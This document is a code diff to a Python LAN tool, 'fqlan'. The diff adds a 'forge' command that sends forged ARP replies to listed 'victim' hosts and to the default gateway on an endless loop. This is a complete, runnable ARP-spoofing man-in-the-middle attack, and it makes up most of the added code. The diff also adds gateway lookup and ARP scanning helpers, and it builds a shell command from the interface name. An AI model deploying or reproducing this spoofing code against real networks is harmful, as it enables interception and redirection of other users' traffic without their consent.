@@ -20,30 +20,42 @@ import dpkt
 LOGGER = logging.getLogger('fqlan')
 
 LAN_INTERFACE = None
-IFCONFIG_PATH = None
+IP_COMMAND = None
+IFCONFIG_COMMAND = None
 RE_IFCONFIG_IP = re.compile(r'inet addr:(\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3})')
 RE_MAC_ADDRESS = re.compile(r'[0-9a-f]+:[0-9a-f]+:[0-9a-f]+:[0-9a-f]+:[0-9a-f]+:[0-9a-f]+')
+RE_DEFAULT_GATEWAY = re.compile(r'default via (\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3})')
 ETH_ADDR_BROADCAST = '\xff\xff\xff\xff\xff\xff'
 ETH_ADDR_UNSPEC = '\x00\x00\x00\x00\x00\x00'
 
 
 def main():
     global LAN_INTERFACE
-    global IFCONFIG_PATH
+    global IFCONFIG_COMMAND
+    global IP_COMMAND
 
-    gevent.monkey.patch_all()
+    gevent.monkey.patch_all(thread=False)
     argument_parser = argparse.ArgumentParser()
     argument_parser.add_argument('--log-file')
     argument_parser.add_argument('--log-level', choices=['INFO', 'DEBUG'], default='INFO')
     argument_parser.add_argument('--lan-interface', default='eth0')
-    argument_parser.add_argument('--ifconfig-path')
+    argument_parser.add_argument('--ifconfig-command')
+    argument_parser.add_argument('--ip-command')
     sub_parsers = argument_parser.add_subparsers()
     scan_parser = sub_parsers.add_parser('scan', help='scan LAN devices')
     scan_parser.add_argument('ip', help='ipv4 address', nargs='+')
     scan_parser.set_defaults(handler=scan)
+    forge_parser = sub_parsers.add_parser('forge', help='forge the mac of ip')
+    forge_parser.add_argument('--from-ip', help='default to the gateway ip')
+    forge_parser.add_argument('--from-mac', help='default to the gateway mac')
+    forge_parser.add_argument('--to-ip', help='default to my ip, choose to fill either --to-ip or --to-mac')
+    forge_parser.add_argument('--to-mac', help='default to my mac, choose to fill either --to-ip or --to-mac')
+    forge_parser.add_argument('victim', help='ip,mac', nargs='+')
+    forge_parser.set_defaults(handler=forge)
     args = argument_parser.parse_args()
     LAN_INTERFACE = args.lan_interface
-    IFCONFIG_PATH = args.ifconfig_path
+    IFCONFIG_COMMAND = args.ifconfig_command
+    IP_COMMAND = args.ip_command
     log_level = getattr(logging, args.log_level)
     logging.basicConfig(stream=sys.stdout, level=log_level, format='%(asctime)s %(levelname)s %(message)s')
     if args.log_file:
@@ -52,8 +64,66 @@ def main():
         handler.setFormatter(logging.Formatter('%(asctime)s %(levelname)s %(message)s'))
         handler.setLevel(log_level)
         logging.getLogger('fqlan').addHandler(handler)
-    args.handler(**{k: getattr(args, k) for k in vars(args) \
-                    if k not in {'handler', 'log_file', 'log_level', 'lan_interface', 'ifconfig_path'}})
+    args.handler(**{k: getattr(args, k) for k in vars(args) if k not in {
+        'handler', 'log_file', 'log_level', 'lan_interface', 'ifconfig_command', 'ip_command'}})
+
+
+def forge(victim, from_ip, from_mac, to_ip, to_mac):
+    LOGGER.info('forge started')
+    my_ip, my_mac = get_ip_and_mac()
+    to_mac = to_mac or arping(my_ip, my_mac, to_ip)
+    if not to_mac:
+        to_ip, to_mac = my_ip, my_mac
+    victims = [v.split(',') for v in victim]
+    for i in range(3):
+        try:
+            sock = socket.socket(socket.PF_PACKET, socket.SOCK_RAW)
+            try:
+                sock.bind((LAN_INTERFACE, dpkt.ethernet.ETH_TYPE_ARP))
+                from_ip = from_ip or get_default_gateway()
+                from_mac = from_mac or arping(my_ip, my_mac, from_ip)
+                LOGGER.info('forge from: %s %s' % (from_ip, from_mac))
+                LOGGER.info('forge to: %s %s' % (to_ip, to_mac))
+                while True:
+                    for victim_ip, victim_mac in victims:
+                        LOGGER.info('forge victim %s %s' % (victim_ip, victim_mac))
+                        send_forged_arp(sock, victim_ip, victim_mac, from_ip, from_mac, to_mac)
+                    gevent.sleep(5)
+            finally:
+                sock.close()
+            return True
+        except:
+            LOGGER.exception('failed to send forged default gateway, retry in 10 seconds')
+            gevent.sleep(10)
+    LOGGER.error('give up forge')
+    return False
+
+
+def send_forged_arp(sock, victim_ip, victim_mac, from_ip, from_mac, to_mac):
+    arp = dpkt.arp.ARP()
+    arp.sha = eth_aton(to_mac)
+    arp.spa = socket.inet_aton(from_ip)
+    arp.tha = eth_aton(victim_mac)
+    arp.tpa = socket.inet_aton(victim_ip)
+    arp.op = dpkt.arp.ARP_OP_REPLY
+    eth = dpkt.ethernet.Ethernet()
+    eth.src = arp.sha
+    eth.dst = eth_aton(victim_mac)
+    eth.data = arp
+    eth.type = dpkt.ethernet.ETH_TYPE_ARP
+    sock.send(str(eth))
+    arp = dpkt.arp.ARP()
+    arp.sha = eth_aton(to_mac)
+    arp.spa = socket.inet_aton(victim_ip)
+    arp.tha = eth_aton(from_mac)
+    arp.tpa = socket.inet_aton(from_ip)
+    arp.op = dpkt.arp.ARP_OP_REPLY
+    eth = dpkt.ethernet.Ethernet()
+    eth.src = arp.sha
+    eth.dst = eth_aton(from_mac)
+    eth.data = arp
+    eth.type = dpkt.ethernet.ETH_TYPE_ARP
+    sock.send(str(eth))
 
 
 def scan(ip):
@@ -62,26 +132,42 @@ def scan(ip):
         return
     if not my_mac:
         return
+    LOGGER.info('scan %s' % ip)
+    for found_ip, found_mac in arping_list(my_ip, my_mac, list_ip(ip)):
+        sys.stderr.write(json.dumps([found_ip, found_mac]))
+        sys.stderr.write('\n')
+    LOGGER.info('scan %s completed' % ip)
+
+
+def arping(my_ip, my_mac, ip):
+    if not ip:
+        return None
+    result = list(arping_list(my_ip, my_mac, [ip]))
+    if not result:
+        raise Exception('mac not found for %s' % ip)
+    return result[0][1]
+
+
+def arping_list(my_ip, my_mac, ip_list):
     sock = socket.socket(socket.PF_PACKET, socket.SOCK_RAW)
     try:
         sock.bind((LAN_INTERFACE, dpkt.ethernet.ETH_TYPE_ARP))
-        for ip in list_ip(ip):
+        for ip in ip_list:
             send_arp_request(sock, my_mac, my_ip, ip)
         count = 0
         found_set = set()
         while True:
-            ins, outs, errors = select.select([sock], [], [sock], timeout=1)
+            ins, outs, errors = select.select([sock], [], [sock], timeout=0.5)
             if errors:
                 raise Exception('socket error: %s' % errors)
             if ins:
                 found_ip, found_mac = receive_arp_reply(ins[0])
                 if my_ip != found_ip and (found_ip, found_mac) not in found_set:
                     found_set.add((found_ip, found_mac))
-                    sys.stderr.write(json.dumps([found_ip, found_mac]))
-                    sys.stderr.write('\n')
+                    yield (found_ip, found_mac)
             else:
                 count += 1
-                if count > 3: # no response for 3 seconds
+                if count > 2: # no response for 1 seconds
                     break
     finally:
         sock.close()
@@ -144,6 +230,7 @@ def list_ip(ip_list):
                 yield int_to_ip(ip_as_int)
             gevent.sleep(0.1)
 
+
 def ip_to_int(ip):
     return struct.unpack('!i', socket.inet_aton(ip))[0]
 
@@ -152,11 +239,27 @@ def int_to_ip(ip_as_int):
     return socket.inet_ntoa(struct.pack('!i', ip_as_int))
 
 
+def get_default_gateway():
+    if IP_COMMAND:
+        output = subprocess.check_output(
+            [IP_COMMAND, 'ip' if 'busybox' in IP_COMMAND else '', 'route'],
+            stderr=subprocess.STDOUT)
+    else:
+        output = subprocess.check_output('ip route', stderr=subprocess.STDOUT, shell=True)
+    for line in output.splitlines():
+        if 'dev %s' % LAN_INTERFACE not in line:
+            continue
+        match = RE_DEFAULT_GATEWAY.search(line)
+        if match:
+            return match.group(1)
+    raise Exception('failed to find default gateway')
+
+
 def get_ip_and_mac():
     try:
-        if IFCONFIG_PATH:
+        if IFCONFIG_COMMAND:
             output = subprocess.check_output(
-                [IFCONFIG_PATH, 'ifconfig' if 'busybox' in IFCONFIG_PATH else '', LAN_INTERFACE],
+                [IFCONFIG_COMMAND, 'ifconfig' if 'busybox' in IFCONFIG_COMMAND else '', LAN_INTERFACE],
                 stderr=subprocess.STDOUT)
         else:
             output = subprocess.check_output('ifconfig %s' % LAN_INTERFACE, stderr=subprocess.STDOUT, shell=True)
